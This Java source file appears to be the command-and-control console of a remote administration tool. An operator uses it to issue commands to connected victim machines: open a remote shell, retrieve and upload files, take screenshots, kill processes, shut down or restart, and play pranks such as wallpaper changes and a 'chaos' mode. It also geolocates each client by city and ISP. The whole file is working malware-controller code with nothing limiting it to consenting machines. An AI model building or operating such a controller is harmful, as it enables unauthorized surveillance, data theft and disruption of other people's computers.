package com.github.connorf.RemoteCommander;

import static com.github.connorf.RemoteCommander.CommandConstants.*;

import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;
import com.maxmind.geoip2.model.CountryResponse;
import com.maxmind.geoip2.model.IspResponse;

import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Map;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * allows for the control of the clients from the server
 */
public class ClientCommander implements Runnable
{
    /** holds all the clients that are currently connected to the server */
    private Map<InetAddress, ConnectedClient> connectedClients;

    public ClientCommander()
    {
        connectedClients = Server.getOnlineClients();
    }

    public void run()
    {
        waitForCommand();
    }

    /**
     * waits for the user of the server to type a command
     */
    private void waitForCommand()
    {
        while(true)
        {
            System.out.print(TERMINAL_PROMPT + " ");
            String command = new Scanner(System.in).nextLine(); // blocks

            if(commandValid(command.split("\\s+")[0]))
                parseAndSendCommand(command);
            else
                System.out.println(TERMINAL_PROMPT + " Unknown command: " + command.split("\\s+")[0]);
        }
    }

    /**
     * checks to see if the command exists
     * @param command the command to check
     * @return true if the command is valid, false otherwise
     */
    private boolean commandValid(String command)
    {
        command = command.toLowerCase();
        return command.equals(CMD_UPLOAD) || command.equals(CMD_TALK) || command.equals(CMD_REMOTE_SHELL) || command.equals(CMD_KILL_PROCESS) || command.equals(CMD_LIST_PROCESSES) || command.equals(CMD_MINIMISE) || command.equals(CMD_WALLPAPER) || command.equals(CMD_ROTATE) || command.equals(CMD_SYSINFO) || command.equals(CMD_RETRIEVE) || command.equals(CMD_TYPE) || command.equals(CMD_CHAOS) || command.equals(CMD_HELP) || command.equals(CMD_COUNT) || command.equals(CMD_ONLINE) || command.equals(CMD_EJECT) || command.equals(CMD_SOUND) || command.equals(CMD_SHUTDOWN) || command.equals(CMD_RESTART) || command.equals(CMD_SCREENSHOT) || command.equals(CMD_MSG);
    }

    /**
     * properly tokenises commands, allowing for variable length arguments for commands
     * @param fullCommand the full command the user typed
     * @return a list containing each part of the command. Quoted arguments are treated as one part, for example
     * msg all "hello there" will be split into: msg, all, hello there
     */
    private ArrayList<String> tokeniseCommand(String fullCommand)
    {
        ArrayList<String> commandTokens = new ArrayList<>();
        Pattern regex = Pattern.compile("[^\\s\"']+|\"([^\"]*)\"|'([^']*)'"); // allows quoted args to be treated as one
        Matcher regexMatcher = regex.matcher(fullCommand);
        while (regexMatcher.find()) {
            if (regexMatcher.group(1) != null) // Add double-quoted string without the quotes
                commandTokens.add(regexMatcher.group(1));
            else if (regexMatcher.group(2) != null) // Add single-quoted string without the quotes
                commandTokens.add(regexMatcher.group(2));
            else // Add unquoted word
                commandTokens.add(regexMatcher.group());
        }
        return commandTokens;
    }

    /**
     * calls the correct method according to argument provided. This is used for commands with no arguments, e.g. count, online, help
     * @param cmd the no argument command to be processed
     */
    private void processZeroArgCommand(String cmd)
    {
        switch(cmd)
        {
            case CMD_ONLINE:
                printOnlineClients();
                break;
            case CMD_COUNT:
                printOnlineCount();
                break;
            case CMD_HELP:
                Help.printHelp(null);
                break;
            default:
        }
    }

    /**
     * used to find a client from an IP address
     * @param ipAddress the supplied IP address of the client wanting to be returned
     * @return a ConnectedClient that has the supplied IP address
     * @throws UnknownHostException if the IP address didn't match any online clients IP addresses
     */
    private ConnectedClient getClientFromIPAddress(String ipAddress) throws UnknownHostException
    {
        ConnectedClient client = connectedClients.get(InetAddress.getByName(ipAddress));
        if(client == null)
            throw new UnknownHostException("[!] Unknown client: " + ipAddress);
        return client;
    }

    /**
     * processes one argument commands, e.g. sysinfo, retrieve, screenshot, eject, shutdown, restart, help, mini, lsprocs, shell
     * @param cmd the command itself, e.g. count
     * @param arg argument for the command
     * @throws IOException if something went wrong printing os info via sysinfo
     */
    private void processOneArgCommand(String cmd, String arg) throws IOException
    {
        if(cmd.equals(CMD_HELP))
        {
            Help.printHelp(arg);
            return;
        }

        ConnectedClient target = null;
        if(arg.equals(HOST_ALL) && !cmd.equals(CMD_REMOTE_SHELL))
            sendCommandAll(cmd);
        else // otherwise get specified client
            target = getClientFromIPAddress(arg);

        if(target != null)
        {
            target.sendCommandPart(cmd);
            if(cmd.equals(CMD_SYSINFO))
                System.out.println(target.getStringFromClient());
            else if(cmd.equals(CMD_RETRIEVE))
                target.retrieve();
            else if(cmd.equals(CMD_LIST_PROCESSES))
                System.out.println(target.getStringFromClient());
            else if(cmd.equals(CMD_REMOTE_SHELL))
                target.controlRemoteShell();
        }
    }

    /**
     * processes two argument commands, e.g. wallpaper, sound, type, rotate, talk, upload
     * @param cmd the command itself, e.g. sound
     * @param host the IP address of the host to perform the command on, or all
     * @param arg an argument for the command
     * @throws IOException if something went wrong sending the file (if the cmd needed to) to the client
     */
    private void processTwoArgCommand(String cmd, String host, String arg) throws IOException
    {
        File toSend = null;
        if(cmd.equals(CMD_SOUND) || cmd.equals(CMD_WALLPAPER) || cmd.equals(CMD_UPLOAD))
            toSend = new File(arg);

        ConnectedClient target = null;
        if(host.equals(HOST_ALL))
        {
            sendCommandAll(cmd);
            if(cmd.equals(CMD_SOUND) || cmd.equals(CMD_WALLPAPER) || cmd.equals(CMD_UPLOAD))
                sendFileAll(toSend);
            else
                sendCommandAll(arg);
            return;
        }
        else
            target = getClientFromIPAddress(host);

        if(target != null)
        {
            target.sendCommandPart(cmd);
            if(cmd.equals(CMD_SOUND) || cmd.equals(CMD_WALLPAPER) || cmd.equals(CMD_UPLOAD))
                target.sendFile(toSend);
            else
                target.sendCommandPart(arg);
        }
    }

    /**
     * processes three argument commands, e.g. chaos, kill
     * @param cmd the command itself, e.g. chaos
     * @param host the IP address of the host or all
     * @param arg1 the argument for the command
     * @param arg2 another argument for the command
     * @throws UnknownHostException if the host could not be found from the supplied IP address
     */
    private void processThreeArgCommand(String cmd, String host, String arg1, String arg2) throws UnknownHostException
    {
        ConnectedClient target = null;
        if(host.equals(HOST_ALL))
        {
            sendCommandAll(cmd);
            sendCommandAll(arg1);
            sendCommandAll(arg2);
        }
        else
        {
            target = getClientFromIPAddress(host);
            target.sendCommandPart(cmd);
            target.sendCommandPart(arg1);
            target.sendCommandPart(arg2);
            try
            {
                if(cmd.equals(CMD_KILL_PROCESS)) // we should listen for a reply (success / failure)
                    System.out.println("[" + target.getAddress().toString().replace("/", "") + "] " + target.getStringFromClient());
            }
            catch(IOException ioe)
            {
                System.out.println("Failed to get string from the client regarding the recent " + CMD_KILL_PROCESS + " command.");
                ioe.printStackTrace();
            }
        }
    }

    /**
     * processes four argument commands, e.g. msg
     * @param cmd command itself, e.g. msg
     * @param host the host IP address or all
     * @param arg1 arg for the command
     * @param arg2 arg for the command
     * @param arg3 arg for the command
     * @throws UnknownHostException if the provided IP address doesn't match any online clients
     */
    private void processFourArgCommand(String cmd, String host, String arg1, String arg2, String arg3) throws UnknownHostException
    {
        ConnectedClient target = null;
        if(host.equals(HOST_ALL))
        {
            sendCommandAll(cmd);
            sendCommandAll(arg1);
            sendCommandAll(arg2);
            sendCommandAll(arg3);
        }
        else
        {
            target = getClientFromIPAddress(host);
            target.sendCommandPart(cmd);
            target.sendCommandPart(arg1);
            target.sendCommandPart(arg2);
            target.sendCommandPart(arg3);
        }
    }

    /**
     * uses the command input by the server user to execute the command on the
     * specified clients
     * @param fullCommand the users command input. Different commands have different args.
     */
    private void parseAndSendCommand(String fullCommand)
    {
        ArrayList<String> commandTokens = tokeniseCommand(fullCommand);
        String command = commandTokens.get(0);

        try
        {
            switch(commandTokens.size())
            {
                case 1:
                    processZeroArgCommand(command);
                    break;
                case 2:
                    processOneArgCommand(command, commandTokens.get(1));
                    break;
                case 3:
                    processTwoArgCommand(command, commandTokens.get(1), commandTokens.get(2));
                    break;
                case 4:
                    processThreeArgCommand(command, commandTokens.get(1), commandTokens.get(2), commandTokens.get(3));
                    break;
                case 5:
                    processFourArgCommand(command, commandTokens.get(1), commandTokens.get(2), commandTokens.get(3), commandTokens.get(4));
                    break;
                default:
                    System.out.println("Unknown command: " + fullCommand);
            }
        }
        catch(UnknownHostException uhe)
        {
            System.out.println(uhe.getMessage());
        }
        catch(IOException ioe)
        {
            System.err.println("Something went wrong sending files over to the client");
        }
    }

    private void sendFileAll(File toSend) throws IOException
    {
        for (Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
            client.getValue().sendFile(toSend);
    }

    /**
     * iterates through each connected client and issues the command
     * @param command the command(s) to send to each client
     */
    private void sendCommandAll(String command)
    {
        for (Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
            client.getValue().sendCommandPart(command);
    }

    /**
     * called when the "count" command is used
     * prints out the number of currently connected clients
     */
    private void printOnlineCount()
    {
        System.out.println("Online: " + connectedClients.size());
    }

    /**
     * prints online client info including their rough location in the world (city & country) and the ISP detected
     */
    private void printOnlineClients()
    {
        File countryDB = new File("geolocation/GeoLite2-Country.mmdb");
        File cityDB = new File("geolocation/GeoLite2-City.mmdb");
        DatabaseReader countryReader = null;
        DatabaseReader cityReader = null;
        try
        {
            countryReader = new DatabaseReader.Builder(countryDB).build();
            cityReader = new DatabaseReader.Builder(cityDB).build();
        }
        catch(IOException ioe)
        {
            System.err.println("Failed create DB readers");
        }

        for(Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
        {
            System.out.print(client.getKey().toString().replace("/", ""));
            try
            {
                CountryResponse country = countryReader.country(client.getKey());
                CityResponse city = cityReader.city(client.getKey());
                IspResponse isp = cityReader.isp(client.getKey());
                System.out.println("\t[ " + city.getCity() + ", " + country.getCountry() + ", " + isp.getIsp() + " ]");
            }
            catch(NullPointerException | IOException | GeoIp2Exception geoExcp)
            {
                System.out.println("\t[ UNKNOWN ]");
            }
        }

        try
        {
            countryReader.close();
            cityReader.close();
        }
        catch(IOException ioe)
        {
            System.err.println("Failed to close DB readers");
        }
    }
}
